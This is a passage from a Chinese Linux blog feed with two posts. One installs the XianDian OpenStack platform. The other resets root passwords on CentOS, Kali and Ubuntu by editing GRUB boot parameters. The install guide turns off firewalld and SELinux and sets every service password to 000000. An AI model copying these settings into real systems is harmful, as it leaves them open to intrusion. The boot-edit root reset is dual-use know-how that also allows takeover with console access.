systemctl start vsftpd</span><br><span class="line">[root@controller ~]# systemctl enable vsftpd</span><br></pre></td></tr></table></figure><h2 id="关闭防火墙配置selinux"><a href="#关闭防火墙配置selinux" class="headerlink" title="关闭防火墙配置selinux"></a>关闭防火墙配置selinux</h2><h4 id="【controller-x2F-compute】"><a href="#【controller-x2F-compute】" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line"># vi /etc/selinux/config</span><br><span class="line">SELINUX=disabled</span><br></pre></td></tr></table></figure><h2 id="清除缓存，验证-yum-源"><a href="#清除缓存，验证-yum-源" class="headerlink" title="清除缓存，验证 yum 源"></a>清除缓存，验证 yum 源</h2><h4 id="【controller-x2F-compute】-1"><a href="#【controller-x2F-compute】-1" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum clean all</span><br><span class="line"># yum list</span><br><span class="line"># yum repolist</span><br><span class="line">//显示repolist: 7,203即为成功。</span><br></pre></td></tr></table></figure><h2 id="编辑环境变量"><a href="#编辑环境变量" class="headerlink" title="编辑环境变量"></a>编辑环境变量</h2><h4 id="【controller-x2F-compute】-2"><a href="#【controller-x2F-compute】-2" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum install iaas-xiandian -y</span><br></pre></td></tr></table></figure><h4 id="【controller】-2"><a href="#【controller】-2" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/xiandian/openrc.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##--------------------system Config--------------------##</span><br><span class="line">##Controller Server Manager IP. example:x.x.x.x</span><br><span class="line">HOST_IP=192.168.100.10</span><br><span class="line"></span><br><span class="line">##Controller HOST Password. example:000000</span><br><span class="line">HOST_PASS=000000</span><br><span class="line"></span><br><span class="line">##Controller Server hostname. example:controller</span><br><span class="line">HOST_NAME=controller</span><br><span class="line"></span><br><span class="line">##Compute Node Manager IP. example:x.x.x.x</span><br><span class="line">HOST_IP_NODE=192.168.100.20</span><br><span class="line"></span><br><span class="line">##Compute HOST Password. example:000000</span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line"></span><br><span class="line">##Compute Node hostname. example:compute</span><br><span class="line">HOST_NAME_NODE=compute</span><br><span class="line"></span><br><span class="line">##--------------------Chrony Config-------------------##</span><br><span class="line">##Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)</span><br><span class="line">network_segment_IP=192.168.100.0/24</span><br><span class="line"></span><br><span class="line">##--------------------Rabbit Config ------------------##</span><br><span class="line">##user for rabbit. example:openstack</span><br><span class="line">RABBIT_USER=openstack</span><br><span class="line"></span><br><span class="line">##Password for rabbit user .example:000000</span><br><span class="line">RABBIT_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------MySQL Config---------------------##</span><br><span class="line">##Password for MySQL root user . exmaple:000000</span><br><span class="line">DB_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Keystone Config------------------##</span><br><span class="line">##Password for Keystore admin user. exmaple:000000</span><br><span class="line">DOMAIN_NAME=demo</span><br><span class="line">ADMIN_PASS=000000</span><br><span class="line">DEMO_PASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Mysql keystore user. exmaple:000000</span><br><span class="line">KEYSTONE_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Glance Config--------------------##</span><br><span class="line">##Password for Mysql glance user. exmaple:000000</span><br><span class="line">GLANCE_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore glance user. exmaple:000000</span><br><span class="line">GLANCE_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Nova Config----------------------##</span><br><span class="line">##Password for Mysql nova user. exmaple:000000</span><br><span class="line">NOVA_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore nova user. exmaple:000000</span><br><span class="line">NOVA_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Neturon Config-------------------##</span><br><span class="line">##Password for Mysql neutron user. exmaple:000000</span><br><span class="line">NEUTRON_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore neutron user. exmaple:000000</span><br><span class="line">NEUTRON_PASS=000000</span><br><span class="line"></span><br><span class="line">##metadata secret for neutron. exmaple:000000</span><br><span class="line">METADATA_SECRET=000000</span><br><span class="line"></span><br><span class="line">##Tunnel Network Interface. example:x.x.x.x</span><br><span class="line">INTERFACE_IP=192.168.100.10</span><br><span class="line"></span><br><span class="line">##External Network Interface. example:eth1</span><br><span class="line">INTERFACE_NAME=ens34</span><br><span class="line"></span><br><span class="line">##External Network The Physical Adapter. example:provider</span><br><span class="line">Physical_NAME=provider</span><br><span class="line"></span><br><span class="line">##First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101</span><br><span class="line">minvlan=101</span><br><span class="line"></span><br><span class="line">##Last Vlan ID in VLAN RANGE for VLAN Network. example:200</span><br><span class="line">maxvlan=200</span><br><span class="line"></span><br><span class="line">##--------------------Cinder Config--------------------##</span><br><span class="line">##Password for Mysql cinder user. exmaple:000000</span><br><span class="line">CINDER_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore cinder user. exmaple:000000</span><br><span class="line">CINDER_PASS=000000</span><br><span class="line"></span><br><span class="line">##Cinder Block Disk. example:md126p3</span><br><span class="line">BLOCK_DISK=sdb1</span><br><span class="line"></span><br><span class="line">##--------------------Swift Config---------------------##</span><br><span class="line">##Password for Keystore swift user. exmaple:000000</span><br><span class="line">SWIFT_PASS=000000</span><br><span class="line"></span><br><span class="line">##The NODE Object Disk for Swift. example:md126p4.</span><br><span class="line">OBJECT_DISK=sdb2</span><br><span class="line"></span><br><span class="line">##The NODE IP for Swift Storage Network. example:x.x.x.x.</span><br><span class="line">STORAGE_LOCAL_NET_IP=192.168.100.20</span><br><span class="line"></span><br><span class="line">##--------------------Heat Config----------------------##</span><br><span class="line">##Password for Mysql heat user. exmaple:000000</span><br><span class="line">HEAT_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore heat user. exmaple:000000</span><br><span class="line">HEAT_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Zun Config-----------------------##</span><br><span class="line">##Password for Mysql Zun user. exmaple:000000</span><br><span class="line">ZUN_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore Zun user. exmaple:000000</span><br><span class="line">ZUN_PASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Mysql Kuryr user. exmaple:000000</span><br><span class="line">KURYR_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore Kuryr user. exmaple:000000</span><br><span class="line">KURYR_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Ceilometer Config----------------##</span><br><span class="line">##Password for Gnocchi ceilometer user. exmaple:000000</span><br><span class="line">CEILOMETER_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore ceilometer user. exmaple:000000</span><br><span class="line">CEILOMETER_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------AODH Config----------------##</span><br><span class="line">##Password for Mysql AODH user. exmaple:000000</span><br><span class="line">AODH_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore AODH user. exmaple:000000</span><br><span class="line">AODH_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Barbican Config----------------##</span><br><span class="line">##Password for Mysql Barbican user. exmaple:000000</span><br><span class="line">BARBICAN_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore Barbican user. exmaple:000000</span><br><span class="line">BARBICAN_PASS=000000</span><br></pre></td></tr></table></figure><h4 id="【controller】-3"><a href="#【controller】-3" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /etc/xiandian/openrc.sh root@192.168.100.20:/etc/xiandian</span><br></pre></td></tr></table></figure><h4 id="【compute】-1"><a href="#【compute】-1" class="headerlink" title="【compute】"></a>【compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/xiandian/openrc.sh</span><br></pre></td></tr></table></figure><p>修改一个地方即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INTERFACE_IP=192.168.100.20</span><br></pre></td></tr></table></figure><h2 id="安装openstack包"><a href="#安装openstack包" class="headerlink" title="安装openstack包"></a>安装openstack包</h2><h4 id="【controller-x2F-compute】-3"><a href="#【controller-x2F-compute】-3" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行脚本命令iaas-pre-host.sh进行安装</span><br><span class="line"># 安装完成后同时重启或者logout</span><br><span class="line">[root@controller ~]# reboot</span><br><span class="line">两台主机source /etc/xiandian/openrc.sh</span><br></pre></td></tr></table></figure><h2 id="安装Mysql数据库服务"><a href="#安装Mysql数据库服务" class="headerlink" title="安装Mysql数据库服务"></a>安装Mysql数据库服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-mysql.sh</span><br></pre></td></tr></table></figure><h2 id="安装Keystone认证服务"><a href="#安装Keystone认证服务" class="headerlink" title="安装Keystone认证服务"></a>安装Keystone认证服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]#iaas-install-keystone.sh</span><br><span class="line">[root@controller ~]# source /etc/keystone/admin-openrc.sh</span><br><span class="line">[root@controller ~]# systemctl status neutron-linuxbridge-agent</span><br></pre></td></tr></table></figure><h2 id="安装Glance镜像服务"><a href="#安装Glance镜像服务" class="headerlink" title="安装Glance镜像服务"></a>安装Glance镜像服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-glance.sh</span><br><span class="line">[root@controller ~] systemctl status openstack-glance-registry</span><br></pre></td></tr></table></figure><p>上传镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] source /etc/keystone/admin-openrc.sh</span><br><span class="line">[root@controller ~] cd /opt/images/</span><br><span class="line">[root@controller ~] source admin-openrc.sh</span><br><span class="line">[root@controller ~] glance image-create --name &quot;CentOS7.5&quot; --disk-format qcow2  --container-format bare --progress &lt;       /opt/images/CentOS_7.5_x86_64_XD.qcow2     </span><br></pre></td></tr></table></figure><h2 id="安装Nova计算服务"><a href="#安装Nova计算服务" class="headerlink" title="安装Nova计算服务"></a>安装Nova计算服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-nova-controller.sh</span><br><span class="line">[root@controller ~]# systemctl status openstack-nova-novncproxy</span><br><span class="line">[root@compute ~]iaas-install-nova-compute.sh</span><br><span class="line">[root@compute-pjl ~]systemctl status openstack-nova-compute</span><br></pre></td></tr></table></figure><h2 id="安装Neutron网络服务"><a href="#安装Neutron网络服务" class="headerlink" title="安装Neutron网络服务"></a>安装Neutron网络服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-neutron-controller.sh</span><br><span class="line">[root@controller ~]systemctl status neutron-server</span><br><span class="line"></span><br><span class="line">[root@compute ~]iaas-install-neutron-compute.sh</span><br><span class="line">[root@compute-pjl ~]systemctl status neutron-linuxbridge-agent</span><br></pre></td></tr></table></figure><h2 id="安装Dashboard服务"><a href="#安装Dashboard服务" class="headerlink" title="安装Dashboard服务"></a>安装Dashboard服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-dashboard.sh</span><br><span class="line">[root@controller ~]# source /etc/keystone/admin-openrc.sh</span><br></pre></td></tr></table></figure><h2 id="安装Cinder块存储服务"><a href="#安装Cinder块存储服务" class="headerlink" title="安装Cinder块存储服务"></a>安装Cinder块存储服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-cinder-controller.sh</span><br><span class="line">[root@controller ~] systemctl status openstack-cinder-scheduler</span><br><span class="line"></span><br><span class="line">[root@compute ~]iaas-install-cinder-compute.sh</span><br><span class="line">[root@compute-pjl ~] systemctl status openstack-cinder-volume</span><br></pre></td></tr></table></figure><h2 id="安装Swift对象存储服务"><a href="#安装Swift对象存储服务" class="headerlink" title="安装Swift对象存储服务"></a>安装Swift对象存储服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-swift-controller.sh</span><br><span class="line">[root@controller ~]# systemctl status openstack-swift-proxy</span><br><span class="line"></span><br><span class="line">[root@compute ~] iaas-install-swift-compute.sh</span><br><span class="line">[root@compute-pjl ~] lsblk #查看sdb2是否挂载到/swift/node/sdb2</span><br></pre></td></tr></table></figure><h2 id="安装Heat编配服务"><a href="#安装Heat编配服务" class="headerlink" title="安装Heat编配服务"></a>安装Heat编配服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-heat.sh</span><br><span class="line">[root@controller ~]# systemctl status openstack-heat-engine</span><br></pre></td></tr></table></figure><h2 id="安装Zun服务"><a href="#安装Zun服务" class="headerlink" title="安装Zun服务"></a>安装Zun服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-zun-controller.sh</span><br><span class="line">[root@controller ~]# systemctl status zun-wsproxy</span><br><span class="line"></span><br><span class="line">[root@compute ~] iaas-install-zun-compute.sh</span><br><span class="line">[root@compute-pjl ~]# systemctl status zun-compute</span><br></pre></td></tr></table></figure><p>以CentOS7_1804.tar镜像为例<br>CentOS7_1804.tar镜像包存放在XianDian-IaaS-v2.4.iso镜像包中。将docker镜像上传到glance中，通过openstack使用镜像启动容器。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] source /etc/keystone/admin-openrc.sh</span><br><span class="line"></span><br><span class="line">[root@controller ~] cd /opt/images/</span><br><span class="line"></span><br><span class="line">[root@controller ~] openstack image create centos7.5 --public --container-format docker --disk-format raw &lt; CentOS7_1804.tar</span><br><span class="line">[root@controller ~] openstack image list</span><br></pre></td></tr></table></figure><h2 id="安装Ceilometer监控服务"><a href="#安装Ceilometer监控服务" class="headerlink" title="安装Ceilometer监控服务"></a>安装Ceilometer监控服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-ceilometer-controller.sh进行安装</span><br><span class="line">[root@controller ~]# systemctl status openstack-ceilometer-central</span><br><span class="line"></span><br><span class="line">[root@compute ~] iaas-install-ceilometer-compute.sh进行安装</span><br><span class="line">[root@compute-pjl~]# systemctl status openstack-ceilometer-compute</span><br></pre></td></tr></table></figure><h2 id="安装Aodh监控服务"><a href="#安装Aodh监控服务" class="headerlink" title="安装Aodh监控服务"></a>安装Aodh监控服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-aodh.sh</span><br><span class="line">[root@controller ~]# systemctl status openstack-aodh-listener</span><br></pre></td></tr></table></figure><h2 id="添加控制节点资源到云平台"><a href="#添加控制节点资源到云平台" class="headerlink" title="添加控制节点资源到云平台"></a>添加控制节点资源到云平台</h2><h4 id="【controller】-4"><a href="#【controller】-4" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] vi /etc/xiandian/openrc.sh </span><br><span class="line"></span><br><span class="line">#Compute Node Manager IP. example:x.x.x.x</span><br><span class="line">HOST_IP_NODE=192.168.100.10</span><br><span class="line"></span><br><span class="line">#Compute HOST Password. example:000000</span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line"></span><br><span class="line">#Compute Node hostname. example:compute</span><br><span class="line">HOST_NAME_NODE=controller</span><br><span class="line"></span><br><span class="line">[root@controller ~]# source /etc/xiandian/openrc.sh </span><br><span class="line">[root@controller ~] iaas-install-nova-compute.sh</span><br></pre></td></tr></table></figure><h2 id="登陆云平台dashboard"><a href="#登陆云平台dashboard" class="headerlink" title="登陆云平台dashboard"></a>登陆云平台dashboard</h2><p>在浏览器中输入<a href="http://192.168.100.10/dashboard">http://192.168.100.10/dashboard</a><br>注：检查防火墙规则，确保允许 http 服务相关端口通行，或者关闭防火墙。<br>创建云主机（gre&#x2F;vlan）<br>（1）管理员 → 网络 → 创建网络（内外网） → 创建子网（外网填服务器的外网网段）<br>（2）项目 → 网络 → 路由 → 新建路由 → 添加网关和内网接口<br>（3）项目 → 计算 → 访问安全 → 管理规则 → 添加规则（ICMP、TCP、UDP）<br>（4）项目 → 计算 → 云主机 → 创建云主机 → 绑定浮动 IP</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;配置ip地址、配置主机名&quot;&gt;&lt;a href=&quot;#配置ip地址、配置主机名&quot; class=&quot;headerlink&quot; title=&quot;配置ip地址、配置主机名&quot;&gt;&lt;/a&gt;配置ip地址、配置主机名&lt;/h2&gt;&lt;p&gt;controller节点：&lt;br&gt;网卡1：192.168.1</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>各种linux的密码重置</title>
    <link href="https://jielunya.github.io/2022/11/23/%E5%90%84%E7%A7%8Dlinux%E7%9A%84%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
    <id>https://jielunya.github.io/2022/11/23/%E5%90%84%E7%A7%8Dlinux%E7%9A%84%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</id>
    <published>2022-11-22T18:38:03.000Z</published>
    <updated>2022-11-22T19:07:41.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Centos6"><a href="#Centos6" class="headerlink" title="Centos6"></a>Centos6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先启动系统，在出现选择操作系统时，直接按E键</span><br><span class="line"></span><br><span class="line">修改GRUB引导，在rhgb quiet最后加&quot;空格&quot;，然后</span><br><span class="line"></span><br><span class="line">键入&quot;1&quot;或&quot;s&quot;或&quot;S&quot;或&quot;single&quot;都可以，最后回车保</span><br><span class="line"></span><br><span class="line">存并返回上一步</span><br><span class="line"></span><br><span class="line">以单用户运行系统，按键盘的”B”键，进入引导系统</span><br><span class="line"></span><br><span class="line">输入passwd root修改密码</span><br><span class="line"></span><br><span class="line">reboot重启</span><br></pre></td></tr></table></figure><h2 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7"></a>Centos7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先启动系统，在出现选择操作系统时，直接按E键</span><br><span class="line"></span><br><span class="line">进入grub界面</span><br><span class="line"></span><br><span class="line">按方向键↑和↓，将光标一直移动到 LANG=en_US.UTF-8 后面</span><br><span class="line"></span><br><span class="line">再添加“_init=/bin/sh” (_为空格键)</span><br><span class="line"></span><br><span class="line">即添加一个空格，再添加init=/bin/sh</span><br><span class="line"></span><br><span class="line">这里特别注意，需要写在UTF-8后，保持在同一行，并注意空格不能缺</span><br><span class="line"></span><br><span class="line">再按ctrl+x进入单用户视图</span><br><span class="line"></span><br><span class="line">以rw方式重新挂载</span><br><span class="line"></span><br><span class="line">mount -o remount,rw /</span><br><span class="line"></span><br><span class="line">输入passwd root修改密码</span><br></pre></td></tr></table></figure><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重启kali系统进入选择界面，在这里选择Kali GNU/Linux，按下键盘中的e键进入恢复模式</span><br><span class="line"></span><br><span class="line">将光标移动到echo的末端，并输入一行代码：rw single init=/bin/bash</span><br><span class="line"></span><br><span class="line">按下ctrl+x，等待片刻跳出命令行界面</span><br><span class="line"></span><br><span class="line">在命令行中输入passwd root，并按下回车，进行一个root密码的更改</span><br></pre></td></tr></table></figure><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重启Uubuntu18.04，长按 shift 进入以下界面，选择Ubuntu高级选项</span><br><span class="line"></span><br><span class="line">进入以下画面，按e进入(recovery mode)，编辑kernel启动参数</span><br><span class="line"></span><br><span class="line">删除红色标记部分。删除”ro recovery nomodeset”</span><br><span class="line"></span><br><span class="line">在刚才删除的后面添加 “quiet splash rw init=/bin/bash”</span><br><span class="line"></span><br><span class="line">Windows平台按下F10重新引导，Mac系统按下Ctrl + x重新引导</span><br><span class="line"></span><br><span class="line">使用passwd命令免密修改root免密</span><br><span class="line"></span><br><span class="line">重启系统，以root用户进入系统</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Centos6&quot;&gt;&lt;a href=&quot;#Centos6&quot; class=&quot;headerlink&quot; title=&quot;Centos6&quot;&gt;&lt;/a&gt;Centos6&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
</feed>
